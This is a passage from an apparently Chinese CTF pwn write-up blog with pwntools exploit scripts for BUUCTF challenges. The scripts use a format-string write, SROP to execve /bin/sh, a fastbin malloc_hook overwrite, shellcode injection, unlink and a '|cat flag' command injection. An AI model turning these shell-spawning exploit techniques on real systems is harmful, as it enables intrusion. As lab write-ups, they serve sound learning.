class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x10</span>+b<span class="number">&#x27;b</span><span class="number">&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(backdoor_addr)</span><br><span class="line">r.recvuntil(b<span class="number">&#x27;</span>[+]What\<span class="string">&#x27;s u name?&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个任意地址读x&#x3D;4就行啦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26902</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">over_flow=<span class="number">0x0804A02C</span></span><br><span class="line">pal=p32(over_flow)+b<span class="number">&#x27;</span>%<span class="number">11</span>$n<span class="number">&#x27;</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>本题就是一个溢出然后一个后门</p><p>因为retn之前没有leave所以没有ebp</p><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>后门</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>常规rop</p><h2 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line"> RELRO:    Partial RELRO</span><br><span class="line"> Stack:    No canary found</span><br><span class="line"> NX:       NX enabled</span><br><span class="line"> PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是系统调用read和write，搞得不能泄露libc基址，很显然栈溢出</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211046.png" alt="image-20240306231221635" style="zoom: 50%;" /><p>没有leave，因此0x10后面就是ret</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211047.png" alt="image-20240306231332851"></p><p>两个gadget，一个rax&#x3D;15是sigreturn ，一个是rax&#x3D;59是execve</p><p>而vuln是系统调用就有syscall</p><p>那么很显然是SROP，万事俱备只差&#x2F;bin&#x2F;sh\x00的addr</p><p>那只能自己写</p><p>那就只能调用read_write看看能不能写到跟&#x2F;bin&#x2F;sh\x00偏移固定的地址啦</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211048.png" alt="image-20240307010520356" style="zoom:50%;" /><p>这个东西一看就知道是地址，就gdb进去看，然后出来看，减一下</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211049.png" alt="image-20240307010810093" style="zoom:50%;" /><p>突然发觉可以用search，记下来</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211050.png" alt="image-20240307010855890" style="zoom:50%;" /><p>偏移是128：这是一个大坑，因为glibc版本不同，他的偏移也是不同的！！！！其实是0x118偏移，但是不改libc版本就是0x128偏移</p><p>因为buf是在rsp+10，而write能写0x30个字节，那么就会有rbp在里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27109</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rax_15_ret=<span class="number">0x04004DA</span></span><br><span class="line">syscall_ret=<span class="number">0x0400517</span></span><br><span class="line">read_write_ret=<span class="number">0x004004F1</span></span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(read_write_ret)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh_addr=u64(sh.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_addr===&gt;&quot;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_execve</span><br><span class="line">frame.rdi=binsh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret</span><br><span class="line">frame_bytes = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(rax_15_ret)+p64(syscall_ret)+frame_bytes</span><br><span class="line">sh.sendline(pal)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>首先是它一开始就给你了一个gift：栈地址</p><p>然后估摸是crashme\x00绕过避免改payload,然后就是溢出</p><p>因为这里\n会截断，所以两个想法</p><p>一个是shellcode写栈上</p><p>一个是rop链</p><h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为内存页的缘故，所以一般刚初始化的堆块起始地址末尾为00</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​首先是分配多个堆块，包括一个size为0x20堆块，以及0x90堆块，然后free chunk1，再改chunk1的fd位指向chunk2，我们是要将chunk2再次malloc，但是fastbin堆块分配的时候会有check size的检查，那么就再覆盖0x90堆块的size为0x20，之后malloc了之后改回来，然后再释放该堆块到unsortedbin，就可以Print泄露libc基址</p><p>​之后便是分配堆块到malloc_hook上方，可以通过字节错位找到相应的堆块</p><p>fastbin中有fd的先被分配</p><p>以下是一些过程</p><p>首先要分配fastbin，就要找到合法的堆块，可以用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_fake_fast addr</span><br></pre></td></tr></table></figure><p>找到堆块</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211051.png" alt="image-20240308142904319"></p><p>填充完就这样</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211052.png" alt="image-20240308145448733"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28594</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y : sh.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">str</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index=<span class="built_in">int</span>, content=<span class="built_in">bytes</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Print</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Command: &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#0  00</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#1  20</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#2  40</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#3  60</span></span><br><span class="line">add(<span class="number">0x90</span>)    <span class="comment">#4  80</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x10</span>)    <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">fill(<span class="number">0</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,pal)</span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#1</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#2 in 4</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xa1</span>)</span><br><span class="line">fill(<span class="number">3</span>,pal)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Print(<span class="number">2</span>)</span><br><span class="line">sh.recv(<span class="number">10</span>)</span><br><span class="line">data=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;addr==========&gt;&quot;</span>,<span class="built_in">hex</span>(data))</span><br><span class="line">main_arena_addr=data-<span class="number">88</span></span><br><span class="line">malloc_hook_addr=main_arena_addr-<span class="number">0x10</span></span><br><span class="line">fake_fastbin=malloc_hook_addr-<span class="number">0x23</span>   <span class="comment">##size=7f</span></span><br><span class="line">libc_base=data-<span class="number">0x3C4B78</span></span><br><span class="line">add(<span class="number">0x90</span>)   <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>)   <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#10</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pal=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+p64(fake_fastbin)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">fill(<span class="number">8</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x60</span>)   <span class="comment">#10 fake_fastbin</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span> </span><br><span class="line">pal=<span class="number">0x13</span>*<span class="string">b&#x27;a&#x27;</span>+p64(one_gadget)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;fake_fast===&gt;&quot;</span>,fake_fastbin)</span><br><span class="line">fill(<span class="number">10</span>,pal)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook===&gt;&quot;</span>,malloc_hook_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#3C4B78</span></span><br></pre></td></tr></table></figure><h3 id="学到的东西"><a href="#学到的东西" class="headerlink" title="学到的东西"></a>学到的东西</h3><p>虽然是一道很简单的题目，但是我一开始还真的没有做出来，记住malloc之后的堆块会清空</p><h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p>这道题第一眼就比较神奇，因为他不能ida反编译，估计是花指令之类的，但是我不会，只能读汇编啦</p><p>就是一个shellcode，很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./mrctf2020_shellcode&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29244</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Show me your magic!\n&#x27;</span>)</span><br><span class="line">sh.sendline(shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h2><p>这道题就是先格式字符串漏洞泄露canary，然后用puts(puts@got)来泄露libc基址</p><h2 id="bjdctf-2020-router"><a href="#bjdctf-2020-router" class="headerlink" title="bjdctf_2020_router"></a>bjdctf_2020_router</h2><p>这道题就是考察一个对于linux命令行的绕过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*(_QWORD *)dest = <span class="string">&#x27; gnip&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input the ip address:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line"><span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">system(dest);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里就是输入<code>|cat flag</code>即可，关于这方面的内容我就写在另一篇md上了</p><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">6020</span>C0:magic</span><br><span class="line"><span class="number">6020E0</span>:heap_array</span><br></pre></td></tr></table></figure><p>就是一个堆溢出</p><p>首先的思路肯定是覆盖一个大数字在magic上，然后就会想到unsortedbin attack，但是要已知fd，然后修改bk为<code>&amp;magic-0x10</code>，但是没有show类函数，搞不定？</p><p>那接下来就是unlink了，这个比较easy，简单说就是一个地址addr有chunk1的地址，然后修改chunk1的fd为addr-0x18，bk为addr-0x10，然后就显然了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./easyheap&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25380</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x,y:sh.sendlineafter(x,y)</span><br><span class="line">sa  = <span class="keyword">lambda</span> x,y:sh.sendafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span>(<span class="params"><span class="string">b&#x27;a&#x27;</span></span>)</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index=<span class="built_in">int</span>,content=<span class="built_in">bytearray</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;Content of heap : &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index=<span class="built_in">int</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">magic_addr=<span class="number">0x6020C0</span></span><br><span class="line">heap_array=<span class="number">0x6020E0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">pal1=p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(heap_array-<span class="number">0x18</span>+<span 